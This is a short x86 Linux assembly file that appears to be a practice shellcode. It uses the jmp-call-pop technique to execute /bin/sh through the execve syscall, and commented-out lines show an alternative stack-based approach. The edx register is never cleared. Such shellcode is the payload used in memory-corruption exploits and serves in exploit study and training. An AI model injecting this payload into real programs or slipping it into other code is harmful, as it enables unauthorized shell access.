

section .text
global main

main:

	jmp short execute


test:
	
	xor eax,eax
	;push eax	;push 0x00
	;push 0x68732f2f	;push half command
	;push 0x6e69622f	;push another , now esp points to /bin/sh
;		mov al,0xb
	pop ebx
	
	mov ecx,eax
	mov al,0xb
	int 0x80

execute:
	call test 
	command: db "/bin/sh",0x00
